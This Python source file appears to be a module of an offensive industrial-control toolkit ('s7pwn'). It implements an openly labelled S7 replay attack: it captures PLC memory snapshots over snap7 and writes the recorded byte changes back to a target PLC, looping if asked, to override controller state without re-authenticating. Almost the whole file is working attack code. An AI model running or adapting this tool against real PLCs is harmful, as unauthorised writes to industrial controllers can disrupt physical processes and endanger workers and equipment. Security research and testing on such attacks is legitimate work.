from __future__ import annotations
"""
replay.py – S7 Replay Attack
----------------------------
Capture a sequence of S7 memory reads/writes from a live PLC session,
save them to a .s7replay JSON file, then replay them back – identical
timing or at a custom speed – to reproduce legitimate operator actions
without re-authenticating.

Usage
-----
  replay capture <file.s7replay> [--duration 30] [--interval 0.5]
  replay run     <file.s7replay> [--speed 1.0] [--loop] [--times N]
  replay list    <file.s7replay>

Attack scenario
---------------
Attacker sniffs a legitimate maintenance window (capture phase),
then replays the exact same write sequence at an arbitrary time
to override PLC state – bypassing authentication because the
session is re-established via snap7 just like any normal client.
"""

import json
import time
import os
from typing import List
from s7pwn.runtime import get_current_target
from s7pwn.utils import s7_connect
from s7pwn.core_io import AREA_MAP, TYPE_MAP, INTERVAL_DEFAULT, MONITOR_RANGE_DEFAULT


# ──────────────────────────────────────────────
#  Helpers
# ──────────────────────────────────────────────

def _dump_snapshot(client, timestamp: float) -> dict:
    """Read M, I, Q areas and return a raw snapshot dict."""
    snap = {"ts": timestamp, "areas": {}}
    for area_str, area_type in AREA_MAP.items():
        try:
            data = client.read_area(area_type, 0, 0, MONITOR_RANGE_DEFAULT)
            snap["areas"][area_str] = list(data)
        except Exception as e:
            snap["areas"][area_str] = []
    return snap


def _print_diff(prev: dict, curr: dict) -> int:
    """Print byte-level differences between two snapshots. Returns change count."""
    changes = 0
    for area_str in ("M", "I", "Q"):
        pb = prev["areas"].get(area_str, [])
        cb = curr["areas"].get(area_str, [])
        for i, (p, c) in enumerate(zip(pb, cb)):
            if p != c:
                print(f"  [{area_str}{i}] {p:#04x} -> {c:#04x}")
                changes += 1
    return changes


# ──────────────────────────────────────────────
#  Sub-commands
# ──────────────────────────────────────────────

def _capture(args: List[str]) -> None:
    """capture <file> [--duration SEC] [--interval SEC]"""
    if not args:
        print("Usage: replay capture <file.s7replay> [--duration 30] [--interval 0.5]")
        return

    outfile = args[0]
    duration = 30.0
    interval = INTERVAL_DEFAULT

    i = 1
    while i < len(args):
        if args[i] == "--duration" and i + 1 < len(args):
            duration = float(args[i + 1]); i += 2
        elif args[i] == "--interval" and i + 1 < len(args):
            interval = float(args[i + 1]); i += 2
        else:
            i += 1

    t = get_current_target()
    if not t:
        print("[!] No target selected."); return

    c = s7_connect(t["ip"], t["rack"], t["slot"])
    if not c:
        print("[!] Connection failed."); return

    print(f"[*] Capturing from {t['ip']} for {duration}s (interval={interval}s)...")
    print(f"[*] Output: {outfile}")
    print("[*] Press Ctrl+C to stop early.\n")

    session = {
        "target": {"ip": t["ip"], "rack": t["rack"], "slot": t["slot"]},
        "captured_at": time.strftime("%Y-%m-%dT%H:%M:%S"),
        "interval": interval,
        "snapshots": [],
    }

    start = time.time()
    prev_snap = None
    count = 0

    try:
        while time.time() - start < duration:
            ts = time.time() - start
            snap = _dump_snapshot(c, round(ts, 3))
            session["snapshots"].append(snap)
            count += 1

            if prev_snap:
                changes = _print_diff(prev_snap, snap)
                if changes:
                    print(f"  ^ t={ts:.2f}s – {changes} byte(s) changed")
            else:
                print(f"[+] Baseline snapshot taken (t=0.000s)")

            prev_snap = snap
            time.sleep(interval)

    except KeyboardInterrupt:
        print("\n[!] Capture interrupted.")
    finally:
        try: c.disconnect()
        except Exception: pass

    with open(outfile, "w") as f:
        json.dump(session, f, indent=2)

    session_duration = round(time.time() - start, 2)
    print(f"\n[+] Captured {count} snapshots over {session_duration}s")
    print(f"[+] Saved to: {os.path.abspath(outfile)}")


def _run(args: List[str]) -> None:
    """run <file> [--speed 1.0] [--loop] [--times N]"""
    if not args:
        print("Usage: replay run <file.s7replay> [--speed 1.0] [--loop] [--times N]")
        return

    infile = args[0]
    speed = 1.0
    loop = False
    times = 1

    i = 1
    while i < len(args):
        if args[i] == "--speed" and i + 1 < len(args):
            speed = float(args[i + 1]); i += 2
        elif args[i] == "--loop":
            loop = True; times = 999999; i += 1
        elif args[i] == "--times" and i + 1 < len(args):
            times = int(args[i + 1]); i += 2
        else:
            i += 1

    if not os.path.exists(infile):
        print(f"[!] File not found: {infile}"); return

    with open(infile) as f:
        session = json.load(f)

    snapshots = session.get("snapshots", [])
    if len(snapshots) < 2:
        print("[!] Replay file has fewer than 2 snapshots – nothing to replay."); return

    t_info = session.get("target", {})
    tgt = get_current_target()
    ip   = tgt["ip"]   if tgt else t_info.get("ip", "")
    rack = tgt["rack"] if tgt else t_info.get("rack", 0)
    slot = tgt["slot"] if tgt else t_info.get("slot", 1)

    if not ip:
        print("[!] No target set and replay file has no target info."); return

    print(f"[*] Replaying {len(snapshots)} snapshots to {ip} (speed={speed}x, times={times if not loop else 'loop'})")
    print("[*] Press Ctrl+C to stop.\n")

    try:
        for run_idx in range(times):
            c = s7_connect(ip, rack, slot)
            if not c:
                print(f"[!] Connection failed on run {run_idx + 1}."); return

            print(f"[>] Run {run_idx + 1}/{times if not loop else '∞'}")
            prev_ts = 0.0
            write_count = 0

            for snap_idx, snap in enumerate(snapshots[1:], 1):
                delay = (snap["ts"] - prev_ts) / speed
                if delay > 0:
                    time.sleep(delay)
                prev_ts = snap["ts"]

                prev_snap = snapshots[snap_idx - 1]
                for area_str, area_type in AREA_MAP.items():
                    prev_bytes = prev_snap["areas"].get(area_str, [])
                    curr_bytes = snap["areas"].get(area_str, [])
                    for byte_idx, (pb, cb) in enumerate(zip(prev_bytes, curr_bytes)):
                        if pb != cb:
                            try:
                                buf = bytearray([cb])
                                c.write_area(area_type, 0, byte_idx, buf)
                                print(f"  [REPLAY] {area_str}{byte_idx}: {pb:#04x} -> {cb:#04x}")
                                write_count += 1
                            except Exception as e:
                                print(f"  [!] Write {area_str}{byte_idx} failed: {e}")

            try: c.disconnect()
            except Exception: pass
            print(f"[+] Run {run_idx + 1} done – {write_count} write(s) replayed.\n")

    except KeyboardInterrupt:
        print("\n[!] Replay stopped by user.")

    print("[+] Replay complete.")


def _list_file(args: List[str]) -> None:
    """list <file>"""
    if not args:
        print("Usage: replay list <file.s7replay>"); return

    infile = args[0]
    if not os.path.exists(infile):
        print(f"[!] File not found: {infile}"); return

    with open(infile) as f:
        session = json.load(f)

    target  = session.get("target", {})
    snaps   = session.get("snapshots", [])
    print(f"Target   : {target.get('ip')} rack={target.get('rack')} slot={target.get('slot')}")
    print(f"Captured : {session.get('captured_at','?')}")
    print(f"Interval : {session.get('interval','?')}s")
    print(f"Snapshots: {len(snaps)}")
    if snaps:
        print(f"Duration : {snaps[-1]['ts']:.2f}s")
    changes_total = 0
    for i in range(1, len(snaps)):
        for area_str in ("M", "I", "Q"):
            pb = snaps[i - 1]["areas"].get(area_str, [])
            cb = snaps[i]["areas"].get(area_str, [])
            changes_total += sum(1 for p, c in zip(pb, cb) if p != c)
    print(f"Total Δ  : {changes_total} byte-changes across all snapshots")


# ──────────────────────────────────────────────
#  Entry point
# ──────────────────────────────────────────────

def replay(args: List[str]) -> None:
    if not args:
        print("Usage: replay <capture|run|list> <file> [options]"); return

    sub = args[0].lower()
    rest = args[1:]

    if sub == "capture":
        _capture(rest)
    elif sub == "run":
        _run(rest)
    elif sub == "list":
        _list_file(rest)
    else:
        print(f"[!] Unknown sub-command: {sub}")
        print("  Valid: capture | run | list")
